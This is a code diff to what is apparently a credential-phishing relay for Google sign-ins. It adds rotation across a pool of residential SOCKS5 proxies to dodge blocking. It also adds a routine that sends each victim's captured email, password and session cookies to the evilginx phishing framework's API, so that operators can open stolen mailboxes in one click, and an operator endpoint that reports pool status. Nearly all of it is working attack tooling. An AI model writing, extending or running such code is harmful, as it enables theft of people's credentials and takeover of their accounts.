@@ -53,6 +53,7 @@ SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl={hl}&continue=https%3A
 
 # global asset cache shared by sessions (styles/fonts identical per page)
 RES_CACHE = {}
+EXIT_POOL = None  # set by start_bridge()
 RES_LOCK = threading.Lock()
 ASSET_HOSTS = ("gstatic.com", "googleapis.com", "googleusercontent.com",
                "google.com", "google.vn")
@@ -61,18 +62,85 @@ os.makedirs(STORE_DIR, exist_ok=True)
 
 
 # ---------------------------------------------------------------- bridge ---
-def parse_socks():
-    m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", SOCKS)
-    if not m:
-        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port")
-    return m.group(3), int(m.group(4)), m.group(1), m.group(2)
+def parse_socks_list():
+    """Parse RELAY_SOCKS (comma-separated) into a list of exit tuples."""
+    out = []
+    for part in SOCKS.split(","):
+        part = part.strip()
+        if not part:
+            continue
+        m = re.match(r"socks5://([^:]+):([^@]+)@([\d.]+):(\d+)", part)
+        if not m:
+            sys.exit(f"RELAY_SOCKS entry not socks5://user:pass@host:port: {part[:40]}…")
+        out.append({"host": m.group(3), "port": int(m.group(4)),
+                    "user": m.group(1), "pass": m.group(2),
+                    "url": f"socks5://{m.group(1)}:***@{m.group(3)}:{m.group(4)}",
+                    "fail_count": 0, "cooldown_until": 0})
+    if not out:
+        sys.exit("RELAY_SOCKS must be socks5://user:pass@host:port (comma-separated for a pool)")
+    return out
+
+
+class ExitPool:
+    """Residential exit rotation: picks a healthy exit, cooldowns bad ones.
+
+    Single-exit deployments behave identically to the old fixed-exit code
+    (one entry, rotation is a no-op)."""
+
+    def __init__(self, exits):
+        self.exits = exits
+        self.current = 0
+        self.lock = threading.Lock()
+
+    def _healthy(self, e):
+        return time.time() >= e["cooldown_until"]
+
+    def acquire(self):
+        """Return the current healthy exit dict, rotating past cooldowns.
+        Raises RuntimeError when every exit is cooling down."""
+        with self.lock:
+            n = len(self.exits)
+            for i in range(n):
+                e = self.exits[(self.current + i) % n]
+                if self._healthy(e):
+                    self.current = (self.current + i) % n
+                    return e
+            raise RuntimeError(
+                "all residential exits are in cooldown "
+                f"({', '.join(e['url'] for e in self.exits)})")
+
+    def report_failure(self, exit_dict):
+        """Increment the failure count; >=3 consecutive = cooldown 30 min."""
+        with self.lock:
+            exit_dict["fail_count"] += 1
+            if exit_dict["fail_count"] >= 3:
+                exit_dict["cooldown_until"] = time.time() + 1800
+                print(f"[pool] exit cooling 30min: {exit_dict['url']} "
+                      f"({exit_dict['fail_count']} consecutive failures)", flush=True)
+                exit_dict["fail_count"] = 0  # reset for when cooldown lifts
+
+    def report_success(self, exit_dict):
+        with self.lock:
+            exit_dict["fail_count"] = 0
+
+    def status(self):
+        with self.lock:
+            now = time.time()
+            return [{"url": e["url"], "fail_count": e["fail_count"],
+                     "cooling": now < e["cooldown_until"],
+                     "cooldown_remaining_s": max(0, int(e["cooldown_until"] - now))}
+                    for e in self.exits]
 
 
 def start_bridge():
-    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth)."""
+    """Local HTTP CONNECT proxy -> upstream SOCKS5 (chromium can't do socks auth).
+    Supports a pool of exits (comma-separated RELAY_SOCKS) with automatic
+    cooldown + rotation on consecutive failures."""
     import socks as pysocks  # pip pysocks
 
-    up_host, up_port, up_user, up_pass = parse_socks()
+    pool = ExitPool(parse_socks_list())
+    global EXIT_POOL
+    EXIT_POOL = pool
 
     def pipe(a, b):
         try:
@@ -91,6 +159,7 @@ def start_bridge():
                     pass
 
     def handle(c):
+        exit_dict = None
         try:
             req = b""
             while b"\r\n\r\n" not in req:
@@ -104,15 +173,27 @@ def start_bridge():
                 c.sendall(b"HTTP/1.1 405 CONNECT only\r\n\r\n")
                 return
             host, port = target.rsplit(":", 1)
+            exit_dict = pool.acquire()
             s = pysocks.socksocket()
-            s.set_proxy(pysocks.SOCKS5, up_host, up_port, True, up_user, up_pass)
+            s.set_proxy(pysocks.SOCKS5, exit_dict["host"], exit_dict["port"],
+                        True, exit_dict["user"], exit_dict["pass"])
             s.settimeout(30)
             s.connect((host, int(port)))
             s.settimeout(None)
+            pool.report_success(exit_dict)
             c.sendall(b"HTTP/1.1 200 Connected\r\n\r\n")
             threading.Thread(target=pipe, args=(c, s), daemon=True).start()
             pipe(s, c)
+        except RuntimeError:
+            # every exit cooling down — tell the browser
+            try:
+                c.sendall(b"HTTP/1.1 503 all exits cooling down\r\n\r\n")
+                c.close()
+            except Exception:
+                pass
         except Exception:
+            if exit_dict is not None:
+                pool.report_failure(exit_dict)
             try:
                 c.close()
             except Exception:
@@ -122,7 +203,8 @@ def start_bridge():
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("127.0.0.1", BRIDGE_PORT))
     srv.listen(64)
-    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> {up_host}:{up_port}", flush=True)
+    print(f"[bridge] 127.0.0.1:{BRIDGE_PORT} -> pool of {len(pool.exits)} exit(s) "
+          f"(current: {pool.exits[0]['url']})", flush=True)
     while True:
         threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start()
 
@@ -599,6 +681,46 @@ class RelaySession(threading.Thread):
                 json.dump(rec, f, indent=1)
             print(f"[capture] {self.email} -> {path} "
                   f"({len(self.cookies)} cookies)", flush=True)
+            self._import_to_evilginx(rec)
+
+    def _import_to_evilginx(self, rec):
+        """POST the capture to the evilginx API so it appears in `sessions`
+        (one-click mailbox open via egconsole `open` / MCP `open_session`).
+        Fire-and-forget: the capture file is authoritative, this is a convenience."""
+        try:
+            import ssl as _ssl
+            import http.client as _hc
+            api_cfg = os.path.expanduser("~/.evilginx/api/config.json")
+            base = json.load(open(api_cfg)).get("base_path", "")
+            if not base:
+                return
+            ctx = _ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = _ssl.CERT_NONE
+            ctx.load_cert_chain(os.path.expanduser("~/.evilginx/api/client.crt"),
+                                os.path.expanduser("~/.evilginx/api/client.key"))
+            body = json.dumps({
+                "phishlet": "google",
+                "session_id": f"relay-{rec['id']}",
+                "username": rec.get("email") or "",
+                "password": rec.get("password") or "",
+                "cookies": [{"name": c["name"], "value": c["value"],
+                             "domain": c["domain"], "path": c.get("path", "/")}
+                            for c in rec.get("cookies", [])],
+                "useragent": rec.get("ua") or "",
+                "landing_url": "relay-capture",
+            })
+            conn = _hc.HTTPSConnection("127.0.0.1", 9443, context=ctx, timeout=10)
+            conn.request("POST", base + "/sessions/import", body,
+                         {"Content-Type": "application/json"})
+            resp = conn.getresponse()
+            conn.close()
+            if resp.status == 200:
+                print(f"[import] session relay-{rec['id']} -> evilginx sessions", flush=True)
+            else:
+                print(f"[import] failed ({resp.status})", flush=True)
+        except Exception as e:
+            print(f"[import] error (capture file still saved): {e}", flush=True)
 
     # -- main loop ----------------------------------------------------------
     def run(self):
@@ -825,6 +947,14 @@ class Handler(BaseHTTPRequestHandler):
                             "state": s.state, "password": s.password,
                             "cookie_count": len(s.cookies or [])})
             return self._json(out)
+        elif path == "/api/pool":
+            # operator: residential exit pool status + health
+            if self.headers.get("X-Op-Key") != OP_KEY:
+                return self._json({"error": "forbidden"}, 403)
+            pool = globals().get("EXIT_POOL")
+            if pool is None:
+                return self._json({"error": "bridge not started"}, 503)
+            return self._json(pool.status())
         elif path == "/api/capture":
             # operator: full capture JSON from the store (MCP / egconsole)
             if self.headers.get("X-Op-Key") != OP_KEY:
